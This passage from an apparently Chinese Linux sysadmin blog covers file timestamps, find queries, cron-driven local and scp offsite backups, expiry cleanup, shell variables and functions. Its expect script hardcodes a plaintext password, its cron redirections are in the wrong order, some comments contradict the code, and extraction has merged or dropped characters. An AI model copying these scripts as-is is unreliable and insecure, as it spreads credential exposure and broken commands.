bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">stat</span> test001.txt<br></code></pre></td></tr></table></figure><p><img src="640-1690382213157-27.png" alt="图片"></p><p><strong>三、ll命令查看文件时间（对照stat命令可验证）</strong></p><p><strong>1.默认显示mtime</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ll </span>test001.txt  <span class="hljs-comment">#默认显示mtime</span><br></code></pre></td></tr></table></figure><p><img src="640-1690382215546-30.png" alt="图片"></p><p><strong>2.展示ctime</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ll</span> <span class="hljs-built_in">--time=ctime</span> <span class="hljs-string">test001</span>.<span class="hljs-string">txt</span> <span class="hljs-comment">#展示ctime</span><br></code></pre></td></tr></table></figure><p><img src="640-1690382217489-33.png" alt="图片"></p><p> <strong>3.展示atime</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ll</span> <span class="hljs-built_in">--time=atime</span> <span class="hljs-string">test001</span>.<span class="hljs-string">txt</span> <span class="hljs-comment">#展示atime</span><br></code></pre></td></tr></table></figure><p><img src="640-1690382223787-36.png" alt="图片"></p><p> <strong>四、测试创建/修改文件的时间</strong></p><p>假定目前的时间是：2022-10-05 13:15:40</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">date <span class="hljs-string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="640-1690382226232-39.png" alt="图片"></p><p><strong>1.创建文件后测试，文件atime、ctime、mtime均一样</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> test001.txtstat test001.txt<br></code></pre></td></tr></table></figure><p><img src="640-1690382227820-42.png" alt="图片"></p><p> <strong>2.修改文件后查看，文件atime不变，ctime、mtime更新</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">echo <span class="hljs-number">123</span> &gt; test001<span class="hljs-selector-class">.txtstat</span> test001<span class="hljs-selector-class">.txt</span><br><br></code></pre></td></tr></table></figure><p><img src="640-1690382229816-45.png" alt="图片"></p><p> <strong>3.更改文件属主后:文件atime、mtime不变，ctime更新</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">chown -R root<span class="hljs-selector-pseudo">:root</span> test001<span class="hljs-selector-class">.txtstat</span> test001<span class="hljs-selector-class">.txt</span><br><br></code></pre></td></tr></table></figure><p><img src="640-1690382231715-48.png" alt="图片"></p><p> <strong>4.创建文件夹，文件atime、ctime、mtime均一样</strong></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir test001mdrstat test001mdr<br></code></pre></td></tr></table></figure><p><img src="640-1690382233711-51.png" alt="图片"></p><p> <strong>5.文件夹内新建文件，文件夹atime不变，ctime与mtime均发生改变</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi test001mdr/test001.txtstat test001mdr<br><br></code></pre></td></tr></table></figure><p><img src="640-1690382236136-54.png" alt="图片"></p><p> <strong>6.修改文件夹的属主，文件夹的atime、mtime不变，ctime更新</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chown</span> -R root:root ./test001mdrstat test001mdr<br><br></code></pre></td></tr></table></figure><p><img src="640-1690382238662-57.png" alt="图片"></p><p><strong>五、常用命令关于文件时间相关(24h为一天前时间节点，0为当前时间)</strong></p><p><strong>1.在当前目录下查询3天内修改过的文件（72h~0）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">find</span> .  -mtime -<span class="hljs-number">3</span> #查询<span class="hljs-number">3</span>天内修改过的文件<br></code></pre></td></tr></table></figure><p><strong>2.在当前目录下查询1天内访问过的文件（24h~0）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">find</span> . -atime -<span class="hljs-number">1</span> #查询<span class="hljs-number">1</span>天内访问过的文件<br></code></pre></td></tr></table></figure><p><img src="640-1690382240954-60.png" alt="图片"></p><p><strong>3.查找50-100 天修改过的文件（100d~50d）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">find</span> / -mtime +<span class="hljs-number">50</span> -mtime -<span class="hljs-number">100</span> #查找<span class="hljs-number">50</span>-<span class="hljs-number">100</span> 天修改过的文件<br></code></pre></td></tr></table></figure><p><img src="640-1690382242980-63.png" alt="图片"></p><p><strong>4.查找过去 1 小时内更改过的文件（60min~0）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">find</span> . -mmin -<span class="hljs-number">60</span> #过去<span class="hljs-number">1</span>小时内更改过的文件<br></code></pre></td></tr></table></figure><p><strong>5.查找前一天修改过的文件（48h~24h）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">find</span> . -mtime <span class="hljs-number">1</span> #查找前一天修改过的文件（<span class="hljs-number">48</span>h~<span class="hljs-number">24</span>h）<br></code></pre></td></tr></table></figure><p><img src="640-1690382245671-66.png" alt="图片"></p><p><strong>6.查找一天前修改过的文件（~48h）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">find</span> . -mtime +<span class="hljs-number">1</span> #查找一天前修改过的文件（~<span class="hljs-number">48</span>h）<br></code></pre></td></tr></table></figure><p><strong>7.查找早于指定日期修改的文件（~=day）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">find</span> .  -newermt <span class="hljs-number">2022</span>-<span class="hljs-number">10</span>-<span class="hljs-number">04</span>  #查找早于指定日期（包含）修改的文件<br></code></pre></td></tr></table></figure><p><img src="640-1690382247791-69.png" alt="图片"></p><p><strong>8.查找24小时内修改的文件（24h~0）</strong></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">find .  -<span class="hljs-keyword">new</span><span class="hljs-type">ermt</span> <span class="hljs-string">&#x27;-24hours&#x27;</span>  <span class="hljs-meta">#查找24小时内修改的文件</span><br></code></pre></td></tr></table></figure><p><img src="640-1690382250031-72.png" alt="图片"></p><p><strong>9.查找10分钟之内修改过的文件（10min~0）</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">find <span class="hljs-regexp">/home/</span> -type f -newermt <span class="hljs-string">&#x27;-10 minutes&#x27;</span> <span class="hljs-comment">#查找10分钟之内修改过的文件</span><br></code></pre></td></tr></table></figure><p><img src="640-1690382252038-75.png" alt="图片"></p><p><strong>10.查找1天之内修改过的文件（24h~0）</strong></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">find . -<span class="hljs-keyword">new</span><span class="hljs-type">ermt</span> <span class="hljs-string">&#x27;1 day ago&#x27;</span> <span class="hljs-meta">#查找1天之前到现在修改的文件</span><br></code></pre></td></tr></table></figure><p><img src="640-1690382255010-78.png" alt="图片"></p><p><strong>11.查找昨天到现在修改的文件-同上（24h~0）</strong></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">find .  -<span class="hljs-keyword">new</span><span class="hljs-type">ermt</span> <span class="hljs-string">&#x27;yesterday&#x27;</span> <span class="hljs-meta">#查找昨天到现在修改的文件</span><br></code></pre></td></tr></table></figure><p><img src="640-1690382257520-81.png" alt="图片"> </p><p><strong>三.本地备份脚本</strong><br><strong>1.本地备份命令测试</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mkdir -p <span class="hljs-regexp">/root/</span>backup/`date <span class="hljs-string">&quot;+%Y-%m-%d&quot;</span>`<br>tar -zcvPf <span class="hljs-regexp">/root/</span>backup<span class="hljs-regexp">/`date &quot;+%Y-%m-%d&quot;`/</span>test20221009.tar.gz <span class="hljs-regexp">/root/</span>test2022100<br></code></pre></td></tr></table></figure><p><img src="640-1690382259464-84.png" alt="图片"></p><p><strong>2.封装shell脚本:compress_backup.sh</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment">#!/bin/bash</span><br>source_folder=/root/test20221009<br>backup_folder=/root/backup/`<span class="hljs-built_in">date</span> <span class="hljs-string">&quot;+%Y-%m-%d&quot;</span>`<br>source_folder_name=`<span class="hljs-built_in">echo</span> <span class="hljs-variable">$source_folder</span> |awk -F <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span>`.tar.gz<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source_folder：<span class="hljs-variable">$source_folder</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;backup_folder: <span class="hljs-variable">$backup_folder</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;source_folder_name: <span class="hljs-variable">$source_folder_name</span>&quot;</span><br><br><span class="hljs-comment">#新建立文件夹</span><br><span class="hljs-built_in">mkdir</span> -p /root/backup/`<span class="hljs-built_in">date</span> <span class="hljs-string">&quot;+%Y-%m-%d&quot;</span>`<br><span class="hljs-comment">#压缩命令</span><br>tar -zcvPf <span class="hljs-variable">$backup_folder</span>/<span class="hljs-variable">$source_folder_name</span>  <span class="hljs-variable">$source_folder</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$source_folder_name</span>文件备份成功&quot;</span><br></code></pre></td></tr></table></figure><p><img src="640-1690382262189-87.png" alt="图片"></p><p><strong>3.加入crond定时任务并将输出与错误重定向至文件</strong></p><p>编辑添加crond定时任务列表</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">crontab -e</span><br></code></pre></td></tr></table></figure><p>设置每天00:00执行一次备份任务，并将标准输出与标准错误重定向至日志文件</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> * * * sh /root/backup/compress_backup.sh <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &gt; /root/backup<br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/log_$(<span class="hljs-keyword">date</span> +\%Y-\%m-\%d)<br></code></pre></td></tr></table></figure><p>测试查看任务执行情况：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">tail <span class="hljs-number">-5</span> /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/cron<br><br></code></pre></td></tr></table></figure><p><img src="640-1690382265005-90.png" alt="图片"></p><p>查看备份文件与本地日志正确生成</p><p><img src="640-1690382267091-93.png" alt="图片"></p><p><strong>四.异地备份脚本</strong></p><p><strong>1.异地备份命令测试：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">scp -C -r <span class="hljs-regexp">/root/</span>backup<span class="hljs-regexp">/2022-10-10/</span> mrswhite@<span class="hljs-number">192.168</span>.<span class="hljs-number">37.9</span>:<span class="hljs-regexp">/root/</span>back_up_offsite<br><br></code></pre></td></tr></table></figure><p>提示输入密码后进行备份</p><p><img src="640-1690382270217-96.png" alt="图片"></p><p> 查看对端文件备份成功</p><p><img src="640-1690382272314-99.png" alt="图片"></p><p> <strong>2.封装expect脚本offsite_backup.expect，当提示输入密码时可自动对应输入密码</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/expect -f# </span><br>获取当前日期 例如：2022-10-12<br><br><span class="hljs-built_in">set</span> date [<span class="hljs-built_in"> clock </span>format [<span class="hljs-built_in"> clock </span>seconds ] -format <span class="hljs-string">&quot;%Y-%m-%d&quot;</span> ]<br><br><span class="hljs-comment"># 传输用户名</span><br><span class="hljs-built_in">set</span> username mrswhite<br><span class="hljs-comment"># 对端hostIP地址</span><br><span class="hljs-built_in">set</span> host 192.168.37.9<br><span class="hljs-comment"># 密码</span><br><span class="hljs-built_in">set</span> password test20221012<br><span class="hljs-comment">#设置本地传输路径-前缀</span><br><span class="hljs-built_in">set</span> source_folder /root/backup<br><span class="hljs-comment">#设置兑换传输路径</span><br><span class="hljs-built_in">set</span> backup_folder /root/back_up_offsite<br><br><span class="hljs-comment">#  expect默认timeout为30S  超过30s未传输完会停止，设置为 -1 则不限制超时时间</span><br><span class="hljs-built_in">set</span> timeout -1<br><span class="hljs-comment"># 压缩  递归   本地绝对路径           用户名   目标IP   目标路径 </span><br>spawn  /usr/bin/scp  -C   -r    <span class="hljs-variable">$source_folder</span>/<span class="hljs-variable">$date</span>/   <span class="hljs-variable">$username</span>@<span class="hljs-variable">$host</span>:<span class="hljs-variable">$backup_folder</span><br>expect  &#123;<br><span class="hljs-string">&quot;*yes/no&quot;</span> &#123;send <span class="hljs-string">&quot;yes\r&quot;</span>;exp_continue&#125;<br><span class="hljs-string">&quot;*password:&quot;</span> &#123;send <span class="hljs-string">&quot;<span class="hljs-variable">$password</span>\r&quot;</span>&#125;<br>&#125;<br>expect eof<br><br></code></pre></td></tr></table></figure><p>运行后查询结果，已实现了无人值守备份的功能</p><p><img src="640-1690382275774-102.png" alt="图片"></p><p> 查看异地文件已生成：</p><p><img src="640-1690382277699-105.png" alt="图片"></p><p> <strong>3.加入crond定时任务并将输出与错误重定向至文件</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">crontab -e</span><br></code></pre></td></tr></table></figure><p>设置每天02:00执行一次异地备份任务，（给本地备份充足的时间预留）并将标准输出与标准错误重定向至日志文件</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> * * * expect /root/backup/offsite_backup.expect <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &gt;  /root/back<br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">up/offsite_log_$(<span class="hljs-keyword">date</span> +\%Y-\%m-\%d)<br></code></pre></td></tr></table></figure><p>修改系统时间，重启crond服务等待定时任务的执行，并查询日志：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">date</span> -s <span class="hljs-string">&quot;2022-10-10 00:59:50&quot;</span><br>service crond restart<br>tail <span class="hljs-number">-5</span> /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/cron<br><br></code></pre></td></tr></table></figure><p><img src="640-1690382280549-108.png" alt="图片"></p><p> 检查异地文件备份成功：</p><p><img src="640-1690382282866-111.png" alt="图片"></p><p><strong>五.定期删除备份</strong></p><p><strong>1.定期删除命令测试：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">find <span class="hljs-regexp">/root/</span>backup/ -mtime +<span class="hljs-number">180</span> | xargs rm -rf &#123;&#125;  <span class="hljs-comment">#删除180天前的文件与文件夹的信</span><br><br></code></pre></td></tr></table></figure><p><img src="640-1690382285105-114.png" alt="图片"></p><p> <strong>2.封装shell脚本delete_expire_backupfile.sh，清理的目录与过期时间可配置</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment">#待清除目录</span><br><span class="hljs-built_in">dir</span>=/root/backup/<br><span class="hljs-comment">#文件的过期周期</span><br>day_expireDay=10<br><span class="hljs-comment">#删除最终为day_expireDay前的备份文件与文件夹信息</span><br>find <span class="hljs-variable">$dir</span> -mtime +<span class="hljs-variable">$day_expireDay</span> | xargs <span class="hljs-built_in">rm</span> -rf &#123;&#125;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$dir</span>下的<span class="hljs-variable">$day_expireDay</span>天前的文件清理成功&quot;</span><br><br></code></pre></td></tr></table></figure><p>查看文件清理效果如下：</p><p><img src="640-1690382287658-117.png" alt="图片"></p><p> <strong>3.加入crond定时任务并将输出与错误重定向至文件</strong></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">crontab -e</span><br></code></pre></td></tr></table></figure><p>设置每天00:00执行一次异地备份任务，并将标准输出与标准错误重定向至日志文件</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> * * * sh /root/backup/delete_expire_backupfile.sh <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &gt; /root/backup/delete_log__$(date +\%Y-\%m-\%d)<br></code></pre></td></tr></table></figure><p>修改系统时间，重启crond服务等待定时任务的执行，并查询日志，文件已清理成功</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">date</span> -s <span class="hljs-string">&quot;2022-10-12 23:59:50&quot;</span><br>service crond restart<br>tail <span class="hljs-number">-5</span> /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/cron<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shell 特殊变量 函数</title>
    <link href="/2023/07/26/shell-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F-%E5%87%BD%E6%95%B0/"/>
    <url>/2023/07/26/shell-%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F-%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p><strong>一、特殊变量介绍：</strong></p><p><strong>1、$* ：代表所有参数，其间隔为IFS内参数的第一个字元</strong></p><p><strong>2、$@ ：与*星号类同，不同之处在于不参照IFS</strong></p><p><strong>3、$# ：代表参数数量</strong></p><p><strong>4、$：代表上一个指令的返回值</strong></p><p><strong>5、$- ：最近执行的foreground pipeline的选项参数</strong></p><p><strong>6、$$ ：本身的process ID</strong></p><p><strong>7、$ ：执行上一个背景指令的PID</strong></p><p><strong>8、$_：显示最后一个执行的命令</strong></p><p><strong>9、$N：shell的第一个外传参数</strong></p><p><strong>二、举例说明：</strong></p><ul><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs vim">[root@localhost test20210730]# <span class="hljs-keyword">vim</span> specila_variable.sh#!/usr/bin/bashecho <span class="hljs-string">&quot;脚本的名字是\$0:&quot;</span> <span class="hljs-string">&quot;$0&quot;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;脚本的参数是\$*:&quot;</span> <span class="hljs-string">&quot;$*&quot;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;参数的数量是\$#:&quot;</span> <span class="hljs-string">&quot;$#&quot;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;脚本执行进程\$$:&quot;</span> <span class="hljs-string">&quot;$$&quot;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;最后执行命令是\$_:&quot;</span> <span class="hljs-string">&quot;$_&quot;</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第2个参数是\$2:&quot;</span> <span class="hljs-string">&quot;$2&quot;</span><br></code></pre></td></tr></table></figure><p>查看运行结果：</p><ul><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">[root@localhost test20210730]# sh specila_variable.sh aa bb cc dd脚本的名字是<span class="hljs-symbol">$</span><span class="hljs-number">0</span>: specila_variable.sh脚本的参数是<span class="hljs-symbol">$</span>*: aa bb cc dd参数的数量是<span class="hljs-symbol">$</span>#: <span class="hljs-number">4</span>　　脚本执行进程<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>: <span class="hljs-number">1368</span>最后执行命令是<span class="hljs-symbol">$</span>_: <span class="hljs-number">1368</span>第<span class="hljs-number">2</span>个参数是<span class="hljs-symbol">$</span><span class="hljs-number">2</span>: bb<br></code></pre></td></tr></table></figure><p><strong>一、函数介绍</strong></p><p>将相同功能的代码模块化，使得代码逻辑上比较简单，代码量少，排错容易</p><p>函数的优点：</p><p><strong>1、代码模块化，调用方便，节省内存</strong></p><p><strong>2、代码模块化，代码量少，排错简单</strong></p><p><strong>3、代码模块化，可以改变代码的执行顺序</strong></p><p>二、函数语法</p><p><strong>1、语法一</strong></p><ul><li></li><li></li><li></li><li></li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">函数名 () &#123;    代码块    <span class="hljs-keyword">return</span> N&#125;<br><br></code></pre></td></tr></table></figure><p><strong>2、语法二</strong></p><ul><li></li><li></li><li></li><li></li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">函数名</span> &#123;    代码块    <span class="hljs-keyword">return</span> <span class="hljs-type">N&#125;</span><br><br></code></pre></td></tr></table></figure><p> <strong>三、函数应用</strong></p><ul><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">#!/usr/bin/bash################################## Author: Mr.white ## Create_Date: <span class="hljs-number">2021</span><span class="hljs-number">-07</span><span class="hljs-number">-30</span> <span class="hljs-number">22</span>:<span class="hljs-number">55</span>:<span class="hljs-number">15</span> ## Version: <span class="hljs-number">1.0</span> ##################################<br>#定义函数start () &#123;    echo <span class="hljs-string">&quot;Apache start......          [OK]&quot;</span>    #return <span class="hljs-number">0</span>&#125;<br>function stop &#123;    echo <span class="hljs-string">&quot;Apache stop ......           [FAIL]&quot;</span>&#125;<br>#调用函数startstop<br></code></pre></td></tr></table></figure><p>查询运行结果：</p><ul><li></li><li></li><li></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[root@localhost test20210730]</span># sh fun1<span class="hljs-selector-class">.shApache</span> start...... <span class="hljs-selector-attr">[OK]</span>Apache stop ...... <span class="hljs-selector-attr">[FAIL]</span><br></code></pre></td></tr></table></figure><p><strong>四、实战：编写nginx启动管理脚本</strong></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs clean">#!/usr/bin/bash<br>#################################<br># Author: Mr.white #<br># Create_Date: <span class="hljs-number">2021</span><span class="hljs-number">-07</span><span class="hljs-number">-31</span> <span class="hljs-number">01</span>:<span class="hljs-number">16</span>:<span class="hljs-number">59</span> #<br># Version: <span class="hljs-number">1.0</span> #<br>#################################<br>#nginx seivice manage script<br><br>#varibles<br>nginx_install_doc=/usr/local/nginx<br>nginxd=$nginx_install_doc/sbin/nginx<br>pid_file=$nginx_install_doc/logs/nginx.pid<br><br>#参考/etc/init.d/network中以下函数库<br># Source function library.<br><span class="hljs-keyword">if</span> [ -f /etc/init.d/functions ];then<br>  . /etc/init.d/functions<br>else<br>  echo <span class="hljs-string">&quot;not found file /etc/init.d/functions&quot;</span><br>  exit<br>fi<br><br><span class="hljs-keyword">if</span> [ -f $pid_file ];then<br>  nginx_process_id=`cat $pid_file`<br>  nginx_process_num=`ps aux |grep $nginx_process_id | grep -v grep|wc -l`<br>fi<br>#function<br><br>start () &#123;<br>#判断nginx没有启动直接启动，否则报错已经启动<br>  <span class="hljs-keyword">if</span> [ -f $pid_file ]&amp;&amp;[ $nginx_process_num -ge <span class="hljs-number">1</span> ];then<br>    echo <span class="hljs-string">&quot;nginx running...&quot;</span><br>  else<br>    <span class="hljs-keyword">if</span> [ -f $pid_file ]&amp;&amp;[ $nginx_process_num -lt <span class="hljs-number">1</span> ];then<br>      rm -f $pid_file<br>      echo <span class="hljs-string">&quot; nginx start `daemon $nginxd` &quot;</span> <br>    fi<br>    echo <span class="hljs-string">&quot; nginx start `daemon $nginxd` &quot;</span> <br>  fi<br>&#125;<br><br>stop () &#123;<br>  <span class="hljs-keyword">if</span> [ -f $pid_file 